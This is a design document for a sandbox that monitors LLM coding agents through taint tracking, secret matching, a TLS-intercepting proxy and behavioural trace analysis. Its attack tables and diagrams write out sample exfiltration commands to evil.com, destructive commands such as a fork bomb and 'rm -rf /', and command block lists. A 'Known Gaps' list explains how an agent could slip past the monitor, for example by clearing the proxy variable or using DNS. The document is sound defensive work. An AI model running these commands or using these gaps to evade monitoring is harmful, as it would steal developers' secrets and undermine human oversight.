# Agent Sandbox: Design Document

## Problem Statement

LLM-powered coding agents operate with broad system access — reading files,
executing commands, making network requests. A compromised or misaligned agent
can exfiltrate secrets (API keys, credentials, PII) from a developer's project,
destroy files, or pivot to external services. Existing sandboxing (containers,
seccomp) restricts *capability* but cannot distinguish legitimate tool use from
data theft. We need a sandbox that understands *content* and *intent*.

## Design Goals

1. **Zero false positives on normal workflows.** `git push`, `npm install`,
   `pip install`, API calls with clean payloads must never be blocked.
2. **Catch encoded/transformed secrets.** Base64, hex, URL-encoding,
   JSON-wrapping, embedding in source code — all must be detected.
3. **Catch evasion strategies.** Char-by-char exfiltration, chunked sends,
   rate-limited drip, shape-pattern repetition.
4. **Real TLS interception.** HTTPS traffic must be decrypted and inspected,
   not just observed at the syscall level.
5. **Fast runtime.** All expensive work (scanning, indexing) happens before the
   agent starts. Runtime enforcement is O(1) lookups and lightweight hashing.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Agent Process                                │
│                                                                     │
│  read .env ──► taint ──► POST https://evil.com {"key":"AKIA..."}   │
│                                    │                                │
│                          env: HTTPS_PROXY=127.0.0.1:PORT            │
│                          env: REQUESTS_CA_BUNDLE=ca-bundle.pem      │
└────────────────────────────┬────────────────────────────────────────┘
                             │ CONNECT evil.com:443
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                       MITM Proxy (port N)                           │
│                                                                     │
│  1. Accept CONNECT tunnel                                           │
│  2. Generate cert for evil.com signed by our CA                     │
│  3. TLS handshake with agent (we are "evil.com" to the agent)       │
│  4. Read plaintext HTTP request                                     │
│  5. ──► Sandbox.check_send(host, body) ◄──                         │
│         │                                                           │
│         ├─ Taint check: is process tainted?                         │
│         ├─ Host check: is host allowlisted?                         │
│         ├─ LSH check: does body contain indexed secrets?            │
│         └─ Anomaly check: rate / shape / accumulator                │
│                                                                     │
│  6a. ALLOW → TLS connect to real evil.com, forward request          │
│  6b. DENY  → return HTTP 403 to agent                               │
└─────────────────────────────────────────────────────────────────────┘
```

## Two Phases

### Build time (before agent starts)

```
Project directory
    │
    ▼
EnvironmentScanner.scan()
    │
    ├── Walk files, classify by path (.env → SECRET, *.py → SOURCE)
    ├── Regex scan for secrets (24+ patterns: AWS, Anthropic, Stripe, DB URLs...)
    ├── Regex scan for PII (SSN, credit cards, emails)
    ├── Detect infrastructure (AWS, GCP, Azure, databases)
    └── Detect frameworks (Express, Django, Flask, React)
    │
    ▼
ScanManifest
    ├── sensitive_files: [".env", "credentials.json", ...]
    ├── sensitive_values: ["AKIAIOSFODNN7EXAMPLE", "sk-ant-...", ...]
    └── file_sensitivity: {".env": "critical", "app.py": "low"}
    │
    ▼
Sandbox(manifest=manifest)
    │
    ├── Pre-index LSH: for each sensitive_value → compute trigrams,
    │   simhash, minhash + base64/hex/url-encoded variants
    ├── Build file_sensitivity lookup table
    └── Ready for runtime
```

### Run time (agent executing)

```
Agent reads .env
    │
    ▼
Sandbox.read_file(".env", content)
    ├── file_sensitivity[".env"] == "critical" → TAINT
    └── lsh.index(content)  (if blind mode, regex-discover secrets)
    │
    ▼
Agent sends POST to evil.com with body containing AKIA...
    │
    ▼
MITM proxy intercepts → Sandbox.check_send("evil.com", body)
    │
    ├─ Step 1: Tainted? YES
    ├─ Step 2: evil.com in allowed_hosts? NO
    └─ → DENY: "tainted process sending to non-allowlisted host"
```

## Core Components

### 1. Taint Tracking

Tracks whether the agent has been "contaminated" by reading sensitive data.
Taint is **monotonic** — once tainted, always tainted. No rollback.

`core/taint.py` provides per-PID taint tracking with parent→child inheritance
and file→process / process→file propagation via fd-to-path mapping.

```python
class TaintLabel(Flag):
    NONE = 0
    CREDENTIAL = auto()      # API keys, passwords, tokens
    PII = auto()              # Personal identifiable information
    FINANCIAL = auto()        # Financial data
    MEDICAL = auto()          # Medical/health data
    INFRASTRUCTURE = auto()   # Internal infrastructure details
    SOURCE_CODE = auto()      # Proprietary source code
```

**Key property:** Taint labels are a Flag enum (`CREDENTIAL | PII | MEDICAL`)
combined with bitwise OR. A process that reads `.env` (CREDENTIAL) and then
`patient_records.csv` (MEDICAL) carries both labels. This enables fine-grained
policy: "block MEDICAL to any host, allow CREDENTIAL to api.github.com."

### 2. LSH Content Matching

Detects secrets even after transformation. Three-stage pipeline:

```
Secret "AKIAIOSFODNN7EXAMPLE"
    │
    ▼ index()
    ├── trigrams: {"AKI", "KIA", "IAI", "AIO", ...}     (char 3-grams)
    ├── simhash: 0x3a7f...                                (64-bit fingerprint)
    ├── minhash: [42, 17, 89, ...]                        (128 hash signatures)
    └── variants:
        ├── base64: "QUtJQUlPU0ZPRE5ON0VYQU1QTEU="
        ├── hex: "414b4941494f53464f444e4e374558414d504c45"
        └── url: "AKIAIOSFODNN7EXAMPLE"  (unchanged)
        Each variant also gets trigrams computed.
```

At check time:

```
Body "{"key": "AKIAIOSFODNN7EXAMPLE", "action": "deploy"}"
    │
    ▼ check()
    ├── Stage 1: Bloom pre-check
    │   body_trigrams ∩ all_indexed_trigrams → overlap ratio
    │   If < 5% → ALLOW (fast reject for clean traffic)
    │
    ├── Stage 2: MinHash Jaccard
    │   Compare minhash signatures → estimate Jaccard similarity
    │
    ├── Stage 3: Combined score
    │   0.25 × simhash_score + 0.40 × minhash_score + 0.35 × bloom_score
    │   If ≥ 0.30 → MATCH
    │
    └── Stage 4: Per-line check (for embedded secrets)
        For each line ≥ 10 chars in body:
          trigram_jaccard(line, indexed_value) ≥ 0.35 → MATCH
```

**Why three strategies?** Single-strategy LSH is bypassable. If only trigram
matching, scatter the secret across unrelated text. If only simhash, add noise
to flip bits. Combined scoring with per-line fallback catches all observed
evasion patterns.

### 3. Anomaly Detection

Catches evasion strategies that try to stay below the LSH detection threshold:

| Detector | What it catches | Threshold |
|----------|----------------|-----------|
| **Rate** | Burst of requests to same host | > 30 requests |
| **Shape** | Repeated request pattern (e.g., `Part <N>: <W>`) | ≥ 4 same shape |
| **Accumulator** | Many small requests adding up | > 500 bytes from > 5 requests |

Shape normalization replaces digits with `<N>` and short tokens with `<W>`,
so `"Part 0: AKIA"`, `"Part 1: IOSF"`, `"Part 2: ODNN"` all map to the same
shape `Part <N>: <W>` and trigger the shape detector after 4 occurrences.

### 4. MITM Proxy

The critical piece that makes HTTPS inspection possible.

**Certificate Authority (`proxy/cert.py`):**
- Generates 2048-bit RSA root CA at startup (1-day validity)
- Signs per-host certificates on demand with SAN extensions
- Caches host certs to avoid regeneration
- Builds a CA bundle (system certs + our CA) for the subprocess

**Proxy server (`proxy/mitm.py`):**
- Binds to `127.0.0.1:0` (OS-assigned port)
- Handles `CONNECT` tunnels for HTTPS
- For each tunnel:
  1. Generate cert for target host, signed by our CA
  2. TLS handshake with client using our cert
  3. Read decrypted HTTP request (method, headers, body)
  4. Pass body through `Sandbox.check_send(host, body)`
  5. If allowed: TLS connect to real server, forward request, relay response
  6. If denied: return `HTTP 403 Forbidden`
- Also handles plain HTTP (GET/POST/PUT) for non-TLS traffic

**Subprocess configuration:**
```python
env = proxy.get_env()
# Returns:
#   HTTP_PROXY=http://127.0.0.1:PORT
#   HTTPS_PROXY=http://127.0.0.1:PORT
#   REQUESTS_CA_BUNDLE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   SSL_CERT_FILE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   CURL_CA_BUNDLE=/tmp/sandbox-certs-xxx/ca-bundle.pem
#   NODE_EXTRA_CA_CERTS=/tmp/sandbox-certs-xxx/ca.pem
```

### 5. Policy Engine

The decision function that combines all signals:

All checks are in `core/policy.py:PolicyEngine`:

```
check_network(pid, host, body):
    if not tainted           → ALLOW
    if host not allowlisted  → DENY  (taint blocks unknown hosts)
    if lsh.check(body)       → DENY  (secret detected in body)
    if anomaly.check(host, body) → DENY  (evasion pattern)
    else                     → ALLOW (clean content to trusted host)

check_exec(pid, command):
    if destructive pattern   → DENY  (rm -rf /, mkfs, dd, fork bomb)
    if tainted + network cmd → DENY  (curl, wget, nc, ssh, scp, rsync)
    else                     → ALLOW

check_file_write(pid, path, project_root):
    if outside project       → DENY
    if system path           → DENY  (/etc, /usr, /bin, /sbin, /var, /boot, /proc, /sys)
    else                     → ALLOW

check_file_delete(pid, path, project_root):
    if outside project       → DENY
    if critical file         → DENY  (.git, .env, package.json, pyproject.toml, etc.)
    else                     → ALLOW
```

`Sandbox` delegates to `PolicyEngine` for all checks. The `Sandbox.check_send()` /
`check_exec()` / `check_write()` / `check_delete()` methods are thin wrappers that
convert `PolicyResult` to `(bool, str)` tuples and record the action in
`blocked_actions` / `allowed_actions`.

**Default allowlisted hosts** (from `core/policy.py`):
```
registry.npmjs.org, pypi.org, files.pythonhosted.org,
rubygems.org, crates.io, api.github.com, github.com,
gitlab.com, bitbucket.org, stackoverflow.com,
docs.python.org, developer.mozilla.org
```

### 6. Environment Scanner

Pre-scans the project directory to build the manifest. Detects:

- **24+ secret patterns:** AWS keys, Anthropic/OpenAI/Stripe API keys, GitHub
  tokens, Slack webhooks, Vault tokens, database URLs, private keys, JWTs
- **PII patterns:** SSNs, credit card numbers, email addresses, IP addresses
- **Infrastructure:** AWS, GCP, Azure, databases, message queues, auth providers
- **Frameworks:** Express, React, Django, FastAPI, Flask, Next.js, Spring, Rails
- **File classification by path:** `.env` → SECRET, `*.py` → SOURCE,
  `Dockerfile` → CI, `*.md` → DOCS

### 7. Trace Analyzer (Behavioral)

Monitors LLM conversation traces for suspicious patterns:

- **Suspicious reasoning:** regex for "exfiltrat", "bypass sandbox", "steal",
  "encode the secret"
- **Task drift:** reads sensitive files + makes network calls unrelated to task
- **Access creep:** touches 3+ sensitive files (warning) or 5+ (critical)
- **Blocked persistence:** keeps trying after N consecutive blocks
- **Encoding behavior:** base64/hex/URL-encoding after reading sensitive files

## Unified Architecture

`sandbox.py` is the high-level orchestrator. It composes primitives from `core/`
with zero duplication:

| Component | Module | What it does |
|-----------|--------|-------------|
| Taint tracking | `core/taint.py` | Per-PID `TaintTracker` with Flag enum, parent→child inheritance, file propagation |
| LSH matching | `core/lsh.py` | Three-stage: trigram bloom → MinHash → combined scoring (SimHash×0.25 + MinHash×0.40 + Bloom×0.35) |
| Anomaly detection | `core/anomaly.py` | Rate (>30/host), shape (≥4 same skeleton), accumulator (>500B from >5 reqs) |
| Policy decisions | `core/policy.py` | `PolicyEngine`: taint → host → LSH → anomaly → ALLOW/DENY |
| Content classification | `core/classifier.py` | Path + content regex → `TaintLabel` (9 path rules, 10 content patterns) |
| LLM classification | `core/llm_classifier.py` | Optional Claude-based assessment for SUSPICIOUS verdicts |
| MITM proxy | `proxy/mitm.py` | TLS termination + MCP-aware JSON-RPC inspection |
| Orchestration | `sandbox.py` | `Sandbox` class: wires everything together, exposes `check_send/exec/write/delete` |

`TaintState` in `sandbox.py` is a thin compatibility wrapper around `TaintTracker`
that exposes `.tainted` and `.taint(source)` for code that reads `sandbox.taint.tainted`.

### MCP Tool Call Interception

Remote MCP servers communicate over HTTP/HTTPS, so the MITM proxy intercepts them
automatically — no separate proxy needed. The proxy is MCP-aware:

1. Detects `tools/call` JSON-RPC in HTTP request bodies
2. Extracts `tool_name` and `arguments`
3. For shell tools (`bash`, `execute`, `run`), calls `check_exec(cmd)`
4. All arguments passed through `check_send(host, args_json)`
5. Records tool calls in `CallSummarizer` with tool-level granularity
6. Tracks `mcp_tool_calls` and per-tool counts in `ProxyStats`

Local MCP servers (stdio-based) are trusted and not intercepted.

## Attack Surface & Defenses

### Disruption Attacks

| Attack | Example | Defense |
|--------|---------|--------|
| Filesystem destruction | `rm -rf /` | `check_exec()` pattern match |
| Fork bomb | `:(){ :\|:& };:` | `check_exec()` pattern match |
| System file corruption | write to `/etc/passwd` | `check_write()` path check |
| Outside-project writes | write to `/tmp/evil` | `check_write()` path check |
| Process killing | `kill -9 1` | `check_exec()` pattern match |
| Disk fill | `dd if=/dev/zero of=big` | `check_exec()` pattern match |

### Disclosure Attacks

| Attack | Example | Defense |
|--------|---------|--------|
| Direct exfil | POST secret to evil.com | Taint + host allowlist |
| Base64 encoding | `QUtJQUlPU0ZP...` | LSH variant matching |
| Hex encoding | `414b494149...` | LSH variant matching |
| URL encoding | `%41%4B%49...` | LSH variant matching |
| JSON wrapping | `{"k":"AKIA..."}` | LSH per-line check |
| Embedded in source | `// AKIA... in code block` | LSH per-line check |
| Via allowlisted host | POST secret to github.com | LSH content check on body |
| Char-by-char | Many 1-byte requests | Anomaly accumulator |
| Chunked | `Part 0: AKI`, `Part 1: AIO` | Anomaly shape detector |
| Rate burst | 50 requests in 1 second | Anomaly rate detector |
| curl from tainted | `curl evil.com -d @.env` | `check_exec()` + taint |

### Known Gaps

1. **Very short secrets** (< 10 chars) may not trigger LSH per-line check.
2. **Custom ciphers** (ROT13, XOR, AES) are not detectable by LSH.
3. **Very slow drip** (1 byte/minute over hours) may evade rate + accumulator.
4. **Steganography** (secret in image pixels) is not inspected.
5. **DNS exfil** (`dig AKIA....evil.com`) is not intercepted by HTTP proxy.
6. **Proxy bypass** — if the agent clears `HTTPS_PROXY` env var or makes raw
   socket connections, the MITM proxy is bypassed. Mitigation: combine with
   network namespace / iptables rules to force all traffic through the proxy.

## Test Coverage

**179 tests total, all passing (~12s).**

| Suite | Tests | What's covered |
|-------|-------|---------------|
| `test_taint.py` | 12 | Label monotonicity, inheritance, propagation |
| `test_lsh.py` | 22 | Trigram, simhash, minhash, variants, false positives |
| `test_integration.py` | 40 | 8 disruption + 11 disclosure + 6 classifier + 3 file change + 9 sandbox + 4 anomaly |
| `test_proxy_inspector.py` | 22 | Proxy content inspection, all exfil vectors |
| `test_e2e.py` | 15 | Strace parser, scanner, full pipeline |
| `test_mitm_e2e.py` | 12 | CA certs, proxy lifecycle, real TLS handshake, subprocess through proxy |
| `test_call_summarizer.py` | 43 | Intent extraction, action classification, timeline, JSONL |
| `test_llm_classifier.py` | 11 | Response parsing, prompt building, LLM assessment (mocked) |
| `test_e2e_runner.py` | 2 | Full pipeline: scan → attacks → adversary → summarizer |

### Key E2E verification

The most important test proves the full pipeline with real TLS:

```
1. Subprocess → TCP connect to proxy
2. Subprocess → CONNECT httpbin.org:443
3. Proxy     ← 200 Connection Established
4. Proxy generates cert for httpbin.org signed by our CA
5. Subprocess → TLS handshake (cipher: TLS_AES_256_GCM_SHA384) ✓
6. Subprocess → POST /post {"key": "AKIAIOSFODNN7EXAMPLE"}
7. Proxy reads 31 bytes of decrypted plaintext
8. Sandbox.check_send() → DENY (tainted + non-allowlisted)
9. Subprocess ← HTTP/1.1 403 Forbidden
```

## Dependencies

- **Python 3.11+** (stdlib: ssl, socket, threading, http.server, subprocess, hashlib, re, json)
- **openssl** (CLI, for cert generation)
- **No external Python packages** for the core sandbox
- **pytest >= 8.0** for tests, **ruff >= 0.4** for linting
- **Optional:** `anthropic >= 0.40` for `LLMClassifier` (`pip install agent-sandbox[llm]`)

## Auto-Summarizer: LLM Call Timeline

The `CallSummarizer` produces a structured log of every LLM conversation turn,
capturing the full intent→action→outcome→verdict chain without requiring any
LLM inference. It uses lightweight regex-based intent extraction and tool call
classification.

### Data Flow

```
LLM Turn
    │
    ├── Reasoning text ──► extract_intent()
    │                       ├── Match intent patterns ("I'll read...", "I'll send...")
    │                       ├── Extract targets (file paths, hosts, URLs)
    │                       └── Flag risk phrases ("exfiltrate", "bypass", "encode secret")
    │
    ├── Tool calls ──► classify_action()
    │                   ├── Map tool_name → ActionCategory
    │                   ├── Reclassify bash+curl → NETWORK_REQUEST
    │                   └── Extract target (path, host, command)
    │
    ├── Sandbox decisions ──► (allowed, reason) per tool call
    │
    └── Alert count from TraceAnalyzer
    │
    ▼
TurnSummary
    ├── intent: IntentSignal (summary, targets, risk_phrases)
    ├── actions: list[ActionRecord] (tool, category, target, allowed, reason)
    ├── verdict: SAFE | SUSPICIOUS | BLOCKED | ERROR
    ├── tainted_at_start: bool
    └── duration_ms: float
```

### Verdict Logic

```
Any action blocked by sandbox?     → BLOCKED
Risk phrases in reasoning?         → SUSPICIOUS
Alerts from TraceAnalyzer?         → SUSPICIOUS
Otherwise                          → SAFE
```

### Output Formats

**Human-readable timeline:**
```
[ ] Turn 1            (0.1ms)
    Intent: read files
    [ALLOW] read_file → file_read  target=.env  (25B)

[X] Turn 2 [TAINTED]  (0.1ms)
    Intent: make network request
    [BLOCK] fetch → network_request  target=https://evil.com/exfil  (0B)
           Reason: BLOCKED: tainted process sending to non-allowlisted host

[ ] Turn 3 [TAINTED]  (0.1ms)
    Intent: edit code
    Targets: app.py
    [ALLOW] edit → code_edit  target=app.py  (2B)
    [ALLOW] bash → shell_command  target=pytest tests/  (8B)
```

**JSONL (for downstream classifiers or log aggregation):**
```json
{"turn":1,"intent":"read files","targets":[],"risk_phrases":[],"actions":[{"tool":"read_file","category":"file_read","target":".env","bytes":25,"allowed":true}],"verdict":"safe","tainted":false}
{"turn":2,"intent":"make network request","actions":[{"tool":"fetch","category":"network_request","target":"https://evil.com/exfil","bytes":0,"allowed":false,"reason":"BLOCKED: tainted + non-allowlisted"}],"verdict":"blocked","tainted":true}
```

### Session Summary

Aggregates across all turns: total actions, files read/written, network requests,
unique hosts, blocked count, suspicious turns, first taint/block turn numbers.

## Tier 2 Classifier: Claude → Future Distillation

The `LLMClassifier` (`core/llm_classifier.py`) implements the Tier 2 classifier
using Claude. It's only called for turns the regex pre-filter flags as SUSPICIOUS.

```
Tier 1: Regex + Heuristic Pre-Filter (every turn, ~0.1ms, free)
    │
    ├── CallSummarizer extracts intent, classifies actions
    ├── Taint + LSH + anomaly checks
    ├── Verdict: SAFE → pass, BLOCKED → enforce
    │
    └── Verdict: SUSPICIOUS → escalate to Tier 2
                    │
                    ▼
Tier 2: Claude Classifier (only suspicious turns, ~500ms, paid)
    │
    ├── Input: turn data (intent, actions, targets) + session context
    ├── Output: RiskAssessment {risk_level, confidence, reasoning, action}
    ├── If "malicious" → escalate to BLOCKED
    └── Every assessment cached as training pair
```

**Integration:** `CallSummarizer` accepts an optional `llm_classifier` parameter.
When a turn gets a SUSPICIOUS verdict from the regex pre-filter, the summarizer
calls `classifier.assess_turn()` and upgrades to BLOCKED if the model says "malicious".

**Dataset generation:** Every assessment is cached in the classifier. Call
`classifier.export_dataset("training.jsonl")` to export input/output pairs as JSONL.
This data can train a smaller local model (ModernBERT, DeBERTa, or similar) to
replace Claude for cost-free runtime classification.

**Optional dependency:** `pip install agent-sandbox[llm]` (requires `anthropic >= 0.40`).
The core sandbox works without it.

### Training Data Strategy

1. Run real agent sessions with `--with-classifier` to accumulate labeled data
2. Export via `classifier.export_dataset()` → JSONL with input/output pairs
3. Fine-tune ModernBERT-base (149M, sub-ms) or DeBERTa-v3-xsmall (22M)
4. Export to ONNX for fast inference
5. Swap Claude for the local model in `CallSummarizer`

### State of the Art: Threat Detection Techniques

Modern endpoint detection has moved decisively to behavioral analysis.
Key data points (2024-2026):

**Industry landscape:**
- **79% of attacks are malware-free** (CrowdStrike 2025 Global Threat Report) —
  credential theft and living-off-the-land dominate. Signature-based detection
  is necessary but insufficient.
- **70% of SOCs rely on AI-driven automation** by 2025.
- Average breakout time: 48 minutes (CrowdStrike).
- SentinelOne's Storyline technology constructs visual attack chain narratives —
  analogous to our timeline summarizer.

**eBPF runtime security (kernel-level, no ptrace):**
- **Falco** (CNCF graduated): detection-only via syscall monitoring, flexible rules
- **Tetragon** (Cilium): detection + enforcement via LSM hooks, lowest CPU overhead
- **Tracee** (Aqua): deep kernel tracing for anomaly detection
- Comparative study (RITECH 2025): all three achieve **100% detection, 0 false
  positives**. Tetragon excels in container escape; Falco in DoS detection.
- Our strace approach is analogous but userspace. Migration path: replace strace
  with eBPF probes for lower overhead.

**ML for syscall/network anomaly detection:**
- **LIGHT-HIDS** (arXiv Sep 2025): compressed neural net for syscall-based HIDS,
  **75x faster** inference than SOTA while improving accuracy. Targets edge
  deployment on NVIDIA Jetson.
- **CNN-BiLSTM-AE** (MDPI Electronics Jul 2025): unsupervised approach combining
  CNN spatial features + BiLSTM temporal features + autoencoder reconstruction.
- **LightGBM**: 97.16% accuracy on binary malware classification (Nature 2025).
  Gradient-boosted trees remain competitive with deep learning.
- Lab classifiers achieve ~95% TPR but **drop to ~60% TPR** in production due to
  distribution shift (arXiv 2024). Key lesson: train on realistic data, not just
  sandbox traces.

**LLM-specific threat landscape:**
- Prompt injection is **OWASP #1 for LLM Applications 2025**. Attack success
  rates reach 84% in agentic systems.
- Production CVEs: Microsoft Copilot (CVSS 9.3), GitHub Copilot (CVSS 9.6),
  Cursor IDE (CVSS 9.8).
- **Meta's "Agents Rule of Two"**: agents exposed to untrusted content operate
  in tight sandboxes, isolated from production. Aligns with our design.
- Only **34.7% of organizations** have deployed dedicated prompt injection
  defenses (Cisco State of AI Security 2026).
- OpenAI launched Lockdown Mode (Feb 2026) and acknowledged prompt injection in
  AI browsers "may never be fully patched."
- **ProtectAI/deberta-v3-base-prompt-injection-v2**: fine-tuned DeBERTa for
  prompt injection detection, ONNX support, available on HuggingFace.
- Supply chain: OWASP elevated Supply Chain Failures to **A03 in 2025 Top 10**.
  The Shai-Hulud npm worm reached 500+ package versions.

**Key insight from modern EDR: behavior > signatures.** Our multi-layer
approach (taint + LSH + anomaly + MITM + trace analysis + auto-summarizer)
mirrors this by combining static signals (secret patterns) with behavioral
signals (access patterns, network timing, request shapes). The auto-summarizer's
JSONL output creates the training data pipeline for the next step: a local ML
classifier that learns from real agent sessions.

## File Map

```
src/agent_sandbox/
├── sandbox.py              # Sandbox class (orchestrator) + CLI entrypoint
├── env_scanner.py          # Pre-scan project for secrets/PII/infrastructure
├── call_summarizer.py      # Auto-summarize LLM tool calls → timeline + JSONL
├── trace_analyzer.py       # Behavioral analysis of LLM reasoning traces
├── doc_scanner.py          # Document content classification
├── e2e_test.py             # Strace-based syscall parser + enforcement
├── core/
│   ├── taint.py            # TaintLabel (Flag enum), TaintTracker (per-PID)
│   ├── lsh.py              # LSHEngine: trigram + simhash + minhash + variants
│   ├── anomaly.py          # AnomalyDetector: rate + shape + accumulator
│   ├── classifier.py       # classify(path, content) → TaintLabel
│   ├── policy.py           # PolicyEngine: combines all signals → Decision
│   └── llm_classifier.py   # LLMClassifier: Claude-based risk assessment (optional)
├── proxy/
│   ├── cert.py             # CertAuthority: CA generation + per-host signing
│   ├── mitm.py             # MITMProxy: CONNECT tunnels, TLS, MCP-aware inspection
│   └── inspector.py        # ProxyInspector: standalone content checker
├── attacks/
│   ├── disruption.py       # 8 disruption scenarios (rm -rf, fork bomb, etc.)
│   ├── disclosure.py       # 11 disclosure scenarios (exfil vectors)
│   └── run_all.py          # Run all 19 attacks + report
└── experiments/
    ├── simulated_adversary.py  # 5 adversary skill levels
    ├── llm_adversarial.py      # LLM-driven red team scaffolding
    └── e2e_runner.py           # Full pipeline: scan → attacks → adversary → report

tests/
├── conftest.py             # Shared fixtures
├── test_taint.py           # 12 tests
├── test_lsh.py             # 22 tests
├── test_integration.py     # 40 tests
├── test_proxy_inspector.py # 22 tests
├── test_e2e.py             # 15 tests
├── test_mitm_e2e.py        # 12 tests
├── test_call_summarizer.py # 43 tests
├── test_llm_classifier.py  # 11 tests
└── test_e2e_runner.py      # 2 tests
```
